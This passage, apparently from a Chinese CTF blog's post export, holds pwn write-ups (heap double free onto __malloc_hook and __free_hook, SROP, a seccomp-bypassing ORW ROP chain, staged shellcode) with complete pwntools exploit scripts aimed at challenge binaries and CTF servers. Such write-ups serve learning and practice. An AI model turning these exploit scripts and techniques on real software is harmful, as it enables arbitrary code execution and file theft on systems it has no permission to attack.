(0x7ff4f33beb78-0x7ff4f2ffa000)success(hex(libc_addr))add(0x68)#4delete(4)malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]edit(2,8,p64(malloc_hook-0x23))add(0x68)#4add(0x68)#5onegadget_addr = libc_addr + 0x4526arealloc_addr = libc_addr + libc.sym[&#x27;realloc&#x27;]success(hex(malloc_hook))payload = cyclic(0xb+0x8)+p64(onegadget_addr)edit(5,len(payload),payload)gdb.attach(io,&#x27;b *$rebase(0xccc)&#x27;)add(0x10) 此时断点打在calloc函数调用时 我们一步步s下去 此时进行了一个逻辑与操作 如果rax寄存器的值为0 那么逻辑与的结果为1 而jne指令当ZF零标志为0的时候 则会跳转 此时rax的值是一个地址 所以会执行jne跳转 我们继续跟进 此时call rax 再次跟进 这一步也就是onegadget判断栈结构的关键了 可以看到esp+0x30处并不等于NULL 所以onegadget执行失败 那么为什么我们改良后 通过realloc来调整栈结构的payload是 1cyclic(0xb)+p64(onegadget_addr)+p64(realloc_addr+2) 我们来看看malloc_hook内存地址附近的情况 可以看到往低地址偏移0x8处是realloc_hook 这也就意味着如果我们按照上面的payload覆写 那么此时程序的执行流程为 因此凭借着readlloc在执行前会进行的push入栈操作 可以实现栈结构调节 不过由于本地和远程以及许多因素 建议还是直接试realloc_addr+x的偏移 完整exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25622)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)def add(size): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;size: &quot;) io.sendline(str(size))def edit(index,size,content): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;content: &quot;) io.sendline(content)def delete(index): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;content: &quot;)add(0x18)#0add(0x68)#1add(0x68)#2add(0x20)#3payload = cyclic(0x10+8)+b&#x27;\\xe1&#x27;edit(0,0x18+10,payload)delete(1)add(0x68)#1show(2)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(main_arena_addr))libc_addr = main_arena_addr - (0x7ff4f33beb78-0x7ff4f2ffa000)success(hex(libc_addr))add(0x68)#4delete(4)malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]edit(2,8,p64(malloc_hook-0x23))add(0x68)#4add(0x68)#5onegadget_addr = libc_addr + 0x4526arealloc_addr = libc_addr + libc.sym[&#x27;realloc&#x27;]success(hex(malloc_hook))gdb.attach(io)payload = cyclic(11)+p64(onegadget_addr)+p64(realloc_addr+2)edit(5,len(payload),payload)add(0x10)io.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"SROP","slug":"SROP","date":"2023-01-27T06:26:51.000Z","updated":"2023-01-27T07:18:02.669Z","comments":true,"path":"2023/01/27/SROP/","link":"","permalink":"http://example.com/2023/01/27/SROP/","excerpt":"","text":"一种独特的rop手法 利用了64位Linux的系统调用号15的rt_sigreturn函数 Linux系统中 信号实际上就是软中断 比如用户在终端输入了ctrl+c 就会终止终端 这时候就需要信号机制 软中断在计组原理中有所提及 这里不重复说明 每一个信号都有自己的名称和编号 对应着不同的功能 可以使用kill -l来查看 而今天要利用的rt_sigreturn函数就是linux中多种信号的一个 rt_sigreturn - 从信号处理函数返回，并清除栈帧 当linux内核确定某进程还有一个未阻塞的信号待处理 当进程下一次从内核态切换到用户态时（比如进行系统调用后 或者是进程重新调度到cpu上） 它会创建用户空间堆栈 或定义的备用堆栈上的一个栈帧 用于保存各种进程上下文 如图所示 其中最关键的就是寄存器的值也会保存在栈上 借助这一点 我们可以很轻易的实现寄存器值的修改 从而实现系统调用 这一段内存被称为Signal Frame 下面来看一道例题 buuctf中的ciscn_2019_es_7 1234567[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 保护机制很常规 看一下ida 12345678signed __int64 vuln()&#123; signed __int64 v0; // rax char buf[16]; // [rsp+0h] [rbp-10h] BYREF v0 = sys_read(0, buf, 0x400uLL); return sys_write(1u, buf, 0x30uLL);&#125; main函数跳转到了vuln函数 vuln函数有栈溢出的机会 同时还给了write函数输出0x30字节的数据 程序还给了gadget函数 伪代码看不出什么 看一下汇编 123456789.text:00000000004004D6 public gadgets.text:00000000004004D6 gadgets proc near.text:00000000004004D6 ; __unwind &#123;.text:00000000004004D6 push rbp.text:00000000004004D7 mov rbp, rsp.text:00000000004004DA mov rax, 0Fh.text:00000000004004E1 retn.text:00000000004004E1 gadgets endp ; sp-analysis failed.text:00000000004004E1 有mov rax，0xf 显然这题就是要利用rt_sigreturn进行srop来实现system系统调用 不过要实现system(“&#x2F;bin&#x2F;sh”)首先我们还需要给rdi赋值binsh字符串的地址 由于题目没有自带binsh 此时有两种办法 一种是泄露libc基址 我们自己计算 还有一种是把binsh写到栈上 然后利用write函数泄露栈地址 gdb动调后发现泄露不到libc基址 所以这里用第二种办法 先gdb动调看一下哪里可以泄露栈地址 我们输入的8字节的字母a位于0x7fffffffdeb0处 而0x7fffffffded0处有一个0x7fffffffdfc8的栈地址可以泄露 我们可以计算偏移 得到栈上的地址 123456789101112from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,27954)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./buu_libc_ubuntu18_64&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;vuln_addr = 0x4004EDpayload = cyclic(0x10)#+p64(vuln_addr)gdb.attach(io)io.sendline(payload)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x118 此时的stack_addr就是我们通过read函数输入的第一个字长的数据的地址 如果我们将其替换成binsh 那么就是binsh字符串的地址 接下来就是伪造Signal Frame了 pwntools自带了库可以实现 123456frame = SigreturnFrame()frame.rax = 59frame.rdi = stack_addrframe.rsi = 0frame.rdx = 0frame.rip = syscall_addr 完整exp: 12345678910111213141516171819202122from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,27954)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./buu_libc_ubuntu18_64&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;vuln_addr = 0x4004EDpayload = cyclic(0x10)+p64(vuln_addr)io.sendline(payload)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x118syscall_addr = 0x400517rax15_addr = 0x4004DAframe = SigreturnFrame()frame.rax = 59frame.rdi = stack_addrframe.rsi = 0frame.rdx = 0frame.rip = syscall_addrpayload = b&#x27;/bin/sh\\x00&#x27;+cyclic(0x8)+p64(rax15_addr)+p64(syscall_addr)+bytes(frame)io.sendline(payload)io.interactive()","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"hgame2023","slug":"hgame2023","date":"2023-01-10T06:17:54.000Z","updated":"2023-02-27T08:23:23.234Z","comments":true,"path":"2023/01/10/hgame2023/","link":"","permalink":"http://example.com/2023/01/10/hgame2023/","excerpt":"","text":"orw以前没做过构造rop链的orw 记录一下 1234567[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/vuln&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 保护没啥值得留意的 直接ida打开看一下main函数 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; init(argc, argv, envp); sandbox(); puts(&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;); vuln(); return 0;&#125; 开了沙盒 不出意外应该是禁用了execve 而system(“&#x2F;bin&#x2F;sh”)也是基于execve实现的 所以这里没有办法像以往一样简单的获取shell seccomp-tools dump .&#x2F;vuln 查看一下是否如同猜想的一样 当调用的函数为execve时进入0004 也就是return kill 禁止调用 那么跟进一下vuln函数 123456ssize_t vuln()&#123; char buf[256]; // [rsp+0h] [rbp-100h] BYREF return read(0, buf, 0x130uLL);&#125; 可以进行一次栈溢出 但是溢出的字节数只有0x28（还有8字节要给ebp） 显然这点溢出长度只够我们泄露libc基址 但是由于被禁用了execve system和onegadget都用不了了 但是如果想用orw的话 很明显 read和open需要的溢出长度远超过0x28 溢出长度不够的情况一般两种解决办法 自己构造一次read 修改rdx的值 使得溢出长度足够 或者是构造一次read 往bss段写入rop链 随后栈迁移 但是总归都是要自己调用read 并且我们还需要pop rsi pop rdx的指令地址 但是由于大部分的题目是动态链接 很难找到单独的rsi和rdx 本题也是没有的 这个时候你要想起来 题目所给的libc文件也是可以用ROPgadget查找指令地址的 只不过使用其指令还需要我们泄露libc基址 那么初步的思路确定了 就可以开始第一步 先泄露基址 12345678910111213141516171819from pwn import*context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./vuln&quot;)#io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31773)rdi_addr = 0x401393rsi_r15_addr = 0x401391puts_got = elf.got[&#x27;puts&#x27;]puts_plt = 0x401070main_addr = 0x4012f0read_plt = 0x401080ret_addr = 0x40101abss_addr = 0x404090+0x50io.recvuntil(&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;)payload = cyclic(0x108)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)io.sendline(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) 接下来是构造read read函数需要三个参数 rdi 控制第一个参数文件描述符 rsi控制写入地址 rdx控制写入字节数 但是很明显0x28的溢出长度是不够我们构造如此多的参数 那么我们可以gdb动调看一下 如果我们不对这三个寄存器动任何手脚 其分别值为多少 rdi满足条件 rdx为0x130 如果我们往bss段写入rop链的话 rdx也不用修改 那么只需要修改rsi就可以了 ROPgadget获取libc文件的pop rsi偏移 再加上libc基址获得pop rsi指令的地址 123io.recvuntil(&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;)payload = cyclic(0x108)+p64(rsi_addr)+p64(bss_addr)+p64(read_addr)+p64(main_addr)io.sendline(payload) 这里注意一下bss_addr 要和bss段的起始位置间隔一段距离 因为bss段比较靠近got表 可能会导致栈空间延申到got表 导致read失败 也是老生常谈的问题了 那么接下里的难点就是构造rop链了 下面每行各自对应open write puts 应该是浅显易懂的 123payload = b&#x27;./flag&#x27;.ljust(8,b&#x27;\\x00&#x27;)+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr+0x100)+p64(rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(rdi_addr)+p64(bss_addr+0x100)+p64(puts_addr) 完整exp: 123456789101112131415161718192021222324252627282930313233343536373839from pwn import*context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./vuln&quot;)io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)#io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31773)rdi_addr = 0x401393rsi_r15_addr = 0x401391puts_got = elf.got[&#x27;puts&#x27;]puts_plt = 0x401070main_addr = 0x4012f0read_plt = 0x401080ret_addr = 0x40101abss_addr = 0x404090+0x50io.recvuntil(&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;)payload = cyclic(0x108)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)io.sendline(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = puts_addr-libc.sym[&#x27;puts&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]rsi_addr = libc_addr + 0x2601frdx_addr = libc_addr + 0x142c92puts_addr = libc_addr + libc.sym[&#x27;puts&#x27;]io.recvuntil(&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;)payload = cyclic(0x108)+p64(rsi_addr)+p64(bss_addr)+p64(read_addr)+p64(main_addr)io.sendline(payload)open_addr = libc_addr + libc.sym[&#x27;open&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]payload = b&#x27;./flag&#x27;.ljust(8,b&#x27;\\x00&#x27;)+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr+0x100)+p64(rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(rdi_addr)+p64(bss_addr+0x100)+p64(puts_addr)io.sendline(payload)leave_addr = 0x4012beio.recvuntil(&quot;Maybe you can learn something about seccomp, before you try to solve this task.&quot;)payload = cyclic(0x100)+p64(bss_addr)+p64(leave_addr)io.sendline(payload)io.recv()io.recv() simple_shellcode1234567[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/vuln&#x27; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 保护全开 ida看一下main函数 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; init(argc, argv, envp); mmap((void *)0xCAFE0000LL, 0x1000uLL, 7, 33, -1, 0LL); puts(&quot;Please input your shellcode:&quot;); read(0, (void *)0xCAFE0000LL, 0x10uLL); sandbox(); MEMORY[0xCAFE0000](); return 0;&#125; mmap将0xcafe0000~0xcafe1000这块区域的权限设置为了可读可写可执行 并且程序的最后还调用了这块区域 明摆着是将shellcode写入到这块区域 同时给了一次写入的机会 但是只有10字节 但是这次又有sandbox函数 看一下是禁用了哪些函数 还是通过orw来读取flag吧 但是这次是采用shellcode的方式 首当其冲要解决的问题就是写入字节不够的问题 这0x10字节的长度虽然不够我们写orw 但是可以供我们调用read函数 但是如果我们想要全部参数都修改一次 也是会超出16字节的 所以还是和上题一样 动态调试看一下传完shellcode后各寄存器的默认值 我们只需要修改rsi rdi即可 rax为read的系统调用号0 不需要修改 123456shellcode = &#x27;&#x27;&#x27;mov esi ,0xcafe0500xor edi ,edisyscalljmp rsi&#x27;&#x27;&#x27; 这里注意一下地址 和bss段同理 栈有可能会溢出到其他不可执行的区域 所以需要抬高一点栈帧空间 随后就是orw的汇编: 1234567891011121314151617shellcode = f&quot;&quot;&quot;push 0x67616c66push (2)pop raxmov rdi, rspxor esi, esicdqsyscallmov r10d, 0x7fffffffmov rsi, raxpush (40)pop raxpush 1pop rdicdqsyscall&quot;&quot;&quot; 完整exp: 12345678910111213141516171819202122232425262728293031323334from pwn import*context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./vuln&quot;)#io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31897)shellcode = &#x27;&#x27;&#x27;mov esi ,0xcafe0500xor edi ,edisyscalljmp rsi&#x27;&#x27;&#x27;io.sendline(asm(shellcode))shellcode = f&quot;&quot;&quot;push 0x67616c66push (2)pop raxmov rdi, rspxor esi, esicdqsyscallmov r10d, 0x7fffffffmov rsi, raxpush (40)pop raxpush 1pop rdicdqsyscall&quot;&quot;&quot;io.sendline(asm(shellcode))io.recv()io.recv() fast_note一道很常规的double free题 不过在最后修改malloc_hook的时候有点特殊 也算有学到新知识 这题是libc 2.23版本 1234567[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)[*] &#x27;/home/chen/vuln&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 123456789101112131415161718192021222324252627282930313233343536373839int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); init(argc, argv, envp); while ( 1 ) &#123; while ( 1 ) &#123; menu(); __isoc99_scanf(&quot;%d&quot;, &amp;v3); if ( v3 != 2 ) break; delete_note(); &#125; if ( v3 &gt; 2 ) &#123; if ( v3 == 3 ) &#123; show_note(&quot;%d&quot;, &amp;v3); &#125; else &#123; if ( v3 == 4 ) exit(0);LABEL_13: puts(&quot;Wrong choice!&quot;); &#125; &#125; else &#123; if ( v3 != 1 ) goto LABEL_13; add_note(); &#125; &#125;&#125; 没有edit函数 add函数的content输入没有堆溢出的机会 看一看delete函数 123456789101112131415161718192021unsigned __int64 delete_note()&#123; unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); printf(&quot;Index: &quot;); __isoc99_scanf(&quot;%u&quot;, &amp;v1); if ( v1 &lt;= 0xF ) &#123; if ( (&amp;notes)[v1] ) free((&amp;notes)[v1]); else puts(&quot;Page not found.&quot;); &#125; else &#123; puts(&quot;There are only 16 pages in this notebook.&quot;); &#125; return __readfsqword(0x28u) ^ v2;&#125; 堆块释放以后 没有对存放堆块的指针置零 存在UAF漏洞 再加上有show函数 那么泄露libc基址我们可以很轻松的通过unsortedbin来做到 12345678910111213141516171819202122232425262728293031323334353637from pwn import*#io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)elf = ELF(&quot;./vuln&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;io = remote(&quot;week-2.hgame.lwsec.cn&quot;,31198)def add(index,size,content): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content: &quot;) io.sendline(content)def delete(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))add(0,0x80,b&#x27;aaaa&#x27;)add(1,0x60,b&#x27;aaaa&#x27;)add(2,0x60,b&#x27;aaaa&#x27;)delete(0)show(0)main_arena = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = main_arena - 88 - 0x3C4B20 应该是很好理解 fastbin的范围只有0x20~0x80 那么我们释放一个0x80大小的chunk就会被放入unsortedbin 这时候其fd和bk域就会指向main_arena_addr 而delete函数没有对这个chunk的指针置零 导致这个我们仍然可以使用这个指针对chunk进行操作 还有一点就是libc基址的计算办法 88这个gdb动调可以很明显的看出来 那这个0x3c4b20呢 以往我们用的是gdb动调看libc基址和当此程序运行时泄露的main_arean的偏移 但是有的时候题目远程靶机和本地的libc版本不一样 这个时候如果你不会用patchelf修改libc的话 可以通过ida打开题目所对应的libc文件 寻找malloc_trim函数 对应的这个dword_1ecb80的偏移就是main_arean相较于libc基址的偏移 接下来的任务是想办法获取shell 2.23的题目直接打malloc_hook就好了 如果没有开启FULL RELRO 的话还可以通过覆写got表来实现shell 这里我们采用打got表 用的是double free的办法 12345678910malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]delete(1)delete(2)delete(1)add(3,0x60,p64(malloc_hook-0x23))add(4,0x60,b&#x27;aaaa&#x27;)add(5,0x60,b&#x27;aaaa&#x27;)one_gadget = libc_addr + 0xf03a4payload = cyclic(0x13)+p64(one_gadget)add(6,0x60,payload) 但是不管我们如果更换one_gadget的偏移 就是打不通 哪怕gdb动调已经可以看到malloc_hook已经被写入one_gadget了 这是因为one_gadget的调用条件不满足 那么常规的利用malloc函数触发malloc_hook肯定是不行的了 询问了其他师傅才知道 double free也能触发malloc_hook 为此也是十分好奇 去翻了翻double free的源码 123456789if (SINGLE_THREAD_P) &#123; /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ if (__builtin_expect (old == p, 0)) malloc_printerr (&quot;double free or corruption (fasttop)&quot;); p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old); *fb = p; &#125; 当glibc检测到double free行为发生后 会调用malloc_printerr用来打印错误日志 但是基于本人水平也就只能朔源到这里了 以下均是猜想 因为malloc_printerr是在malloc.c中定义的 所以调用malloc_printerr就会和malloc函数一样先对malloc_hook的内容进行if判断 如果不为0则执行 完整exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import*#io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)elf = ELF(&quot;./vuln&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;io = remote(&quot;week-2.hgame.lwsec.cn&quot;,31198)def add(index,size,content): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content: &quot;) io.sendline(content)def delete(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))add(0,0x80,b&#x27;aaaa&#x27;)add(1,0x60,b&#x27;aaaa&#x27;)add(2,0x60,b&#x27;aaaa&#x27;)delete(0)show(0)main_arena = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = main_arena - 88 - 0x3C4B20malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]delete(1)delete(2)delete(1)add(3,0x60,p64(malloc_hook-0x23))add(4,0x60,b&#x27;aaaa&#x27;)add(5,0x60,b&#x27;aaaa&#x27;)one_gadget = libc_addr + 0xf03a4payload = cyclic(0x13)+p64(one_gadget)add(6,0x60,payload)delete(3)delete(3)io.interactive() new_fast_note这题的主体结构和上题一致 不过版本从2.23到了2.31 这给我们的unsortedbin泄露机制和double free都制造了困难 由于多出了tcachebin 所以我们想要让一个chunk进入unsortedbin 要么就申请超出tcachebin范围 即0x400以上大小的chunk 或者填满tcachebin的一个链表 然后再次释放 如果超出fastbin的范围就会被放入unsortedbin 这里采取第二种办法 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import*context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./vuln&quot;)#io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)io = remote(&quot;week-2.hgame.lwsec.cn&quot;,32435)def add(index,size,content): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content: &quot;) io.sendline(content)def delete(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))for i in range(0,8): add(i,0x80,b&#x27;aaaa&#x27;)for i in range(0,7): delete(i)delete(7)show(7)main_arena = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = main_arena-96-0x1ECB80 接下来我们的思路要放在如何篡改free_hook来获取shell 没有edit函数的情况下 又有UAF 我们很容易想到的是利用double free来做到任意地址写 但是2.31的版本 glibc对于double free的检查机制更加严格了 123456typedef struct tcache_entry&#123; struct tcache_entry *next; //链表指针，对应chunk中的fd字段 /* This field exists to detect double frees. */ struct tcache_perthread_struct *key; //指向所属的tcache结构体，对应chunk中的bk字段&#125; tcache_entry; 对于每一个tcache都有一个key指针指向 借助这个key指针 plmalloc可以更好的对double free进行检查 123456789101112131415161718192021222324size_t tc_idx = csize2tidx(size);//只要tcache不为空 并且free chunk在tcache范围中 都需要进行double free检查 if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; /* Check to see if it&#x27;s already in the tcache. */ tcache_entry *e = (tcache_entry *)chunk2mem(p); /* 如果是这个chunk已经被放入tcache 那么key字段就已经有数据了 会被识别出来 */ if (__glibc_unlikely(e-&gt;key == tcache))//汇报错误信息 &#123; tcache_entry *tmp; LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr(&quot;free(): double free detected in tcache 2&quot;); &#125; if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) //通过检查，放入tcahce中 &#123; tcache_put(p, tc_idx); return; &#125; &#125; 所以 如果我们还想要使用tcache double free的话 就只能修改key字段 或者是fastbin double free 但是由于fastbin对于chunk的取出有着size域的检查 相对来说不好办 但是在2.27.9版本以后 tcache新增了stash机制 要想明白这个机制的用处 我们先要清楚tcachebin的设计目的是什么 在多线程的情况下 plmalloc会遇到主分配区被抢占的问题 只能等待或者是申请一个非主分配区 针对这种情况 plmalloc为每个线程都涉及一个缓冲区 即tcache 而stash机制就是 如果用户申请一个0x60大小的chunk tcache里面没有的话 就会进入分配区处理 如果在fastbin中找到可以被申请的0x60chunk 系统就会认为将来还需要0x60大小的chunk 就会将fastbin中相同大小的chunk全部放入tcachebin中 因此我们利用这个手法就可以实现 在fastbin中实现double free 而在tcache中进行任意地址chunk的申请 完整exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import*context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./vuln&quot;)#io = process(&quot;./vuln&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)io = remote(&quot;week-2.hgame.lwsec.cn&quot;,32435)def add(index,size,content): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content: &quot;) io.sendline(content)def delete(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;&gt;&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))for i in range(0,8): add(i,0x80,b&#x27;aaaa&#x27;) //chunk0-chunk6用来填满tcache chunk7用来泄露基址for i in range(0,7): delete(i)for i in range(0,7): add(i,0x30,b&#x27;aaaa&#x27;) //填满tcache 从而使chunk8和chunk9可以被放入fastbin 之所以index和前面的垃圾chunk一样 是因为 //程序对于delete函数进行了限制 只能释放index&lt;=0xf的chunkfor i in range(8,11): add(i,0x30,b&#x27;aaaa&#x27;)for i in range(0,7): delete(i)delete(7)show(7)main_arena = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = main_arena-96-0x1ECB80free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]delete(8)delete(9)delete(8)for i in range(0,7): add(i,0x30,b&#x27;aaaa&#x27;) //将原本的tcache 0x40的链表全部的chunk申请 使其为空 触发stash机制add(8,0x30,p64(free_hook))add(9,0x30,b&#x27;aaaa&#x27;)add(11,0x30,b&#x27;aaaa&#x27;)one_gadget = libc_addr + 0xe3b01add(12,0x30,p64(system_addr))add(13,0x10,b&#x27;/bin/sh&#x27;)delete(13)io.interactive() YukkuriSay非栈上格式化字符串漏洞题 checksec 查看一下保护机制发现还有canary机制 12345678[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: &#x27;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/&#x27; 由于本人没有安装libc2.31以上版本的ubuntu 所以本地和远程的环境不一样 这里采用xclibc脚本更换二进制文件所依赖的libc GitHub - ef4tless&#x2F;xclibc: A tool to change the libc environment of running files(一个在CTF比赛中用于切换题目运行libc环境的工具) 1xclibc -x pwn libc-2.31.so 再来看一下ida反编译出来的伪代码 123456789101112131415161718192021222324unsigned __int64 vuln()&#123; int v1; // [rsp+8h] [rbp-118h] char s1[4]; // [rsp+Ch] [rbp-114h] BYREF char buf[264]; // [rsp+10h] [rbp-110h] BYREF unsigned __int64 v4; // [rsp+118h] [rbp-8h] v4 = __readfsqword(0x28u); puts(&quot;What would you like to let Yukkri say?&quot;); do &#123; v1 = read(0, buf, 0x100uLL); if ( buf[v1 - 1] == 10 ) buf[v1 - 1] = 0; print_str(buf); puts(&quot;anything else?(Y/n)&quot;); __isoc99_scanf(&quot;%2s&quot;, s1); 